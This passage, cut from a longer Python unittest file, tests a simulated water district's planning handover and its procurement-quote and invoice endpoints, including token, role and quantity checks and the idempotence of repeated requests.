            self.assertEqual(record["planning_handover_reserve_ml"], self.evidence["reported_ml"])
            self.assertEqual(record["report_consistency"], "accepted")
            self.assertFalse(record["live_process_state_changed"])
            self.assertFalse(record["prior_evidence_changed"])
            status, repeated = plan("planning.planning-handover", handover_request, expected=201)
            self.assertEqual(result, repeated)

    # ------------------------------------------------------------------ W35
    def test_w35_replacement_water_costs(self) -> None:
        business = self.host("business_workplace")

        with self.subTest(card="W35.1 what replacement water costs"):
            status, _ = request(self.discovered_route("business.procurement-quote"), token="wrong")
            self.assertEqual(status, 403)
            status, response = request(self.discovered_route("business.procurement-quote"), expected=200)
            record = response["record"]
            self.evidence["replacement_catalog"] = record["record_id"]
            self.evidence["replacement_catalog_revision"] = record["revision"]
            self.evidence["procurement_reference"] = record["district_procurement_reference"]

        with self.subTest(card="W35.2 a quote outside your district"):
            baseline = {
                "procurement_reference": self.evidence["procurement_reference"],
                "catalog_revision": self.evidence["replacement_catalog_revision"],
                "role": "corporate-reader", "district": self.evidence["source_district"],
            }
            status, _ = request(self.discovered_route("business.procurement-quote-external"), method="POST", body=dict(baseline, role="field-reader"))
            self.assertEqual(status, 403)
            status, response = request(self.discovered_route("business.procurement-quote-external"), method="POST", body=baseline, expected=201)
            record = response["record"]
            self.evidence["foreign_quote"] = record["record_id"]
            self.evidence["foreign_quote_revision"] = record["revision"]
            self.evidence["foreign_quote_supplier"] = record["supplier"]
            self.evidence["foreign_quote_ml"] = record["quantity_ml"]
            self.evidence["foreign_quote_total_usd"] = record["quoted_total_usd"]

        with self.subTest(card="W35.3 the wrong bill"):
            order_request = {
                "quote_id": self.evidence["foreign_quote"], "expected_revision": self.evidence["foreign_quote_revision"],
                "supplier": self.evidence["foreign_quote_supplier"], "quantity_ml": self.evidence["foreign_quote_ml"],
                "planning_window": self.evidence["planning_window"], "charge_district": self.evidence["source_district"],
                "budget": f"BUD-{self.evidence['asset_bundle']['asset'].split('-')[1]}-DP3",
            }
            status, _ = request(self.discovered_route("business.invoice"), method="POST", body=dict(order_request, quantity_ml=1.0))
            self.assertEqual(status, 409)
            status, response = request(self.discovered_route("business.invoice"), method="POST", body=order_request, expected=201)
            record = response["record"]
            self.assertEqual(record["quote_owner_district"], "Merewick")
            self.assertEqual(record["charge_district"], self.evidence["source_district"])
            self.assertEqual(record["liability_usd"], self.evidence["foreign_quote_total_usd"])
            status, repeated = request(self.discovered_route("business.invoice"), method="POST", body=order_request, expected=201)
            self.assertEqual(repeated["record"], record)


if __name__ == "__main__":
    unittest.main(verbosity=2)
